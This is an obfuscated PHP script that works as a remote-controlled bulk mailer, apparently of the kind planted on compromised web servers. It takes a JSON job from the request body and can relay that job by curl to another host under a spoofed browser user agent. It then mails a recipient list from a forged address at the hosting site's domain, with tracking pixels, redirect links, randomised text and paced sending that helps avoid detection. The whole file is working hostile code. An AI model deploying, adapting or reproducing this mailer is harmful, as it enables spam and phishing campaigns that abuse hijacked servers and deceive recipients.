<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp642acf) { if ($sp642acf == 'keys') { return array_keys($this->_keys); } } public function Import($sp642acf, $sp4aaad8) { if (is_array($sp4aaad8)) { $this->values[$sp642acf] = array(); foreach ($sp4aaad8 as $sp1cadbe) { if (!empty($sp1cadbe['key'])) { $this->values[$sp642acf][$sp1cadbe['key']] = $sp1cadbe['value']; } else { $this->values[$sp642acf][] = $sp1cadbe['value']; } } } else { $this->Assign($sp642acf, $sp4aaad8); } } public function Assign($sp642acf, $sp20c819) { $this->values[$sp642acf] = $sp20c819; } public function Parse($sp0b205f) { $sp5bd4a2 = ''; $sp6760d4 = 0; while (true) { $sp36fb93 = strpos($sp0b205f, '{', $sp6760d4); if ($sp36fb93 === false) { $sp5bd4a2 .= substr($sp0b205f, $sp6760d4); break; } $sp5bd4a2 .= substr($sp0b205f, $sp6760d4, $sp36fb93 - $sp6760d4); $sp6760d4 = $sp36fb93 + 1; $spb02e4f = ''; $sp9bacfe = '{'; $sp12b99b = array(); $sp1a479b = false; $sp7511ad = false; $spe91662 = 'var'; while ($sp6760d4 < strlen($sp0b205f)) { $sp142426 = substr($sp0b205f, $sp6760d4, 1); $sp9bacfe .= $sp142426; if ($sp142426 == ',' || $sp142426 == '>' || $sp142426 == '|') { if ($spe91662 == 'alias') { $sp1a479b = $spb02e4f; } elseif ($spe91662 == 'mod') { $sp7511ad = $spb02e4f; } else { $sp12b99b[] = $spb02e4f; } $spb02e4f = ''; if ($sp142426 == '>') { $spe91662 = 'alias'; } if ($sp142426 == '|') { $spe91662 = 'mod'; } $sp6760d4++; continue; } if ($sp142426 == '}') { if ($spe91662 == 'alias') { $sp1a479b = $spb02e4f; } elseif ($spe91662 == 'mod') { $sp7511ad = $spb02e4f; } else { $sp12b99b[] = $spb02e4f; } $sp6760d4++; break; } $spb02e4f .= $sp142426; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp142426) == 0) { $sp6760d4++; $sp12b99b = array(); break; } $sp6760d4++; } if (sizeof($sp12b99b) == 0) { $sp5bd4a2 .= $sp9bacfe; continue; } $spf4edb5 = false; $spf04050 = false; if (preg_match('/^\\^/', $sp12b99b[0]) > 0) { $sp12b99b[0] = substr($sp12b99b[0], 1); $spf4edb5 = true; } if (preg_match('/^\\!/', $sp12b99b[0]) > 0) { $sp12b99b[0] = substr($sp12b99b[0], 1); $spf04050 = true; } $spaca9f6 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp12b99b[0], $spa1244b) > 0) { $spaca9f6 = $spa1244b[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp12b99b[0], $spa1244b) > 0) { $spaca9f6 = explode('-', $spa1244b[1]); } if ($spaca9f6 !== false) { $sp12b99b[0] = substr($sp12b99b[0], 0, strpos($sp12b99b[0], '[')); } $this->_keys[$sp12b99b[0]] = true; if (empty($this->values[$sp12b99b[0]]) && empty($this->fixed[$sp12b99b[0]])) { continue; } if ($spf4edb5) { unset($this->fixed[$sp12b99b[0]]); } if (isset($this->fixed[$sp12b99b[0]])) { $spfedbb1 = $this->fixed[$sp12b99b[0]]; } else { $spfedbb1 = ''; $sp248eb2 = 1; if (sizeof($sp12b99b) == 2) { $sp248eb2 = $sp12b99b[1]; } if (sizeof($sp12b99b) == 3) { $sp248eb2 = rand($sp12b99b[1], $sp12b99b[2]); } for ($sp817882 = 0; $sp817882 < $sp248eb2; $sp817882++) { if (is_array($this->values[$sp12b99b[0]])) { if (!is_array($this->used[$sp12b99b[0]])) { $this->used[$sp12b99b[0]] = array(); } if (count($this->used[$sp12b99b[0]]) == count($this->values[$sp12b99b[0]])) { $this->used[$sp12b99b[0]] = array(); } if ($spaca9f6 !== false && is_scalar($spaca9f6)) { $spfedbb1 .= $this->values[$sp12b99b[0]][$spaca9f6]; $this->used[$spaca9f6] = true; } else { $sp564e9c = array(); if (is_array($spaca9f6)) { $sp4f01e6 = $spaca9f6[0]; $spd64c99 = $spaca9f6[1]; } else { $sp4f01e6 = 0; $spd64c99 = count($this->values[$sp12b99b[0]]) - 1; } for ($spe3787c = $sp4f01e6; $spe3787c <= $spd64c99; $spe3787c++) { if ($spf04050 && !empty($this->used[$sp12b99b[0]][$spe3787c])) { continue; } $sp564e9c[] = $spe3787c; } $sp22cd5d = $sp564e9c[rand(0, count($sp564e9c) - 1)]; $this->used[$sp12b99b[0]][$sp22cd5d] = true; $spfedbb1 .= $this->values[$sp12b99b[0]][$sp22cd5d]; } } else { $spfedbb1 .= $this->values[$sp12b99b[0]]; } } } $spfedbb1 = $this->Parse($spfedbb1); if ($sp7511ad !== false) { for ($sp37439a = 0; $sp37439a < strlen($sp7511ad); $sp37439a++) { switch (substr($sp7511ad, $sp37439a, 1)) { case 'b': $spfedbb1 = base64_encode($spfedbb1); break; case 'q': $spfedbb1 = quoted_printable_encode($spfedbb1); break; default: break; } } } if ($spf4edb5) { $this->fixed[$sp12b99b[0]] = $spfedbb1; } if ($sp1a479b !== false && $sp1a479b != '') { $this->fixed[$sp1a479b] = $spfedbb1; } $sp5bd4a2 .= $spfedbb1; } return $sp5bd4a2; } } $spd2494c = file_get_contents('php://input'); $sp656a8f = json_decode($spd2494c, true); if (empty($sp656a8f['via_proxy'])) { $sp656a8f['via_proxy'] = true; $sp0957f3 = curl_init($sp656a8f['prefix'] . $sp656a8f['files']['s']); $sp327b74 = json_encode($sp656a8f); curl_setopt($sp0957f3, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp0957f3, CURLOPT_TIMEOUT, 600); curl_setopt($sp0957f3, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp0957f3, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp0957f3, CURLOPT_REFERER, $sp40a46b); curl_setopt($sp0957f3, CURLOPT_POST, true); curl_setopt($sp0957f3, CURLOPT_POSTFIELDS, $sp327b74); curl_setopt($sp0957f3, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp327b74))); $spc11563 = curl_exec($sp0957f3); echo $spc11563; die; } $sp839b11 = $_SERVER['SERVER_ADDR']; $sp6aa122 = $_SERVER['HTTP_HOST']; $sp6aa122 = preg_replace('/^www\\./', '', $sp6aa122); $sp801c4d = new Macros(); $sp801c4d->Assign('server_addr', $sp839b11); $sp801c4d->Assign('server_host', $sp6aa122); foreach ($sp656a8f['macros'] as $sp642acf => $sp4aaad8) { $sp801c4d->Import($sp642acf, $sp4aaad8); } $spe09020 = preg_replace('/^www\\./i', '', $sp6aa122); $spb39c53 = $sp801c4d->Parse('{from_user}@' . $spe09020); $sp801c4d->Assign('from_email', $spb39c53); $sp801c4d->Assign('prefix', $sp656a8f['prefix']); $sp801c4d->Assign('html', $sp656a8f['letter']['html']); $sp6760d4 = 0; $sp1d2c65 = 0; $sp93e8d5 = 0; $sp37fa18 = array(); foreach ($sp656a8f['rcpt'] as $sp38437f) { $sp801c4d->Assign('email', $sp38437f['email']); $sp801c4d->Assign('entry', $sp38437f); $sp801c4d->Assign('date', date('r')); $sp801c4d->Assign('redirect', $sp656a8f['prefix'] . $sp656a8f['files']['r']); $sp801c4d->Assign('redirect_with_uri', $sp656a8f['prefix'] . $sp656a8f['files']['r'] . '?uri='); $sp801c4d->Assign('unsubscribe', $sp656a8f['prefix'] . $sp656a8f['files']['u'] . '?id=' . $sp38437f['id']); $sp801c4d->Assign('delivery', '<img src="' . $sp656a8f['prefix'] . $sp656a8f['files']['d'] . '?id=' . $sp38437f['id'] . '" />'); $sp991cc3 = $sp801c4d->Parse($sp656a8f['envelope']['header']); $spbbe75f = $sp801c4d->Parse($sp656a8f['envelope']['body']); if (!empty($sp38437f['name'])) { $sp7e2b0f = $sp38437f['name'] . ' <' . $sp38437f['email'] . '>'; } else { $sp7e2b0f = $sp38437f['email']; } $spddf111 = $sp801c4d->Parse($sp656a8f['letter']['subject']); if ($sp6760d4 > 0) { sleep(rand(3, 8)); } $sp84de32 = mail($sp7e2b0f, $spddf111, $spbbe75f, $sp991cc3); $sp37fa18[$sp38437f['id']] = $sp84de32; if ($sp84de32) { $sp1d2c65++; } else { $sp93e8d5++; } $sp6760d4++; } echo serialize(array('total' => count($sp656a8f['rcpt']), 'sent' => $sp6760d4, 'success' => $sp1d2c65, 'error' => $sp93e8d5, 'rcpt' => $sp37fa18));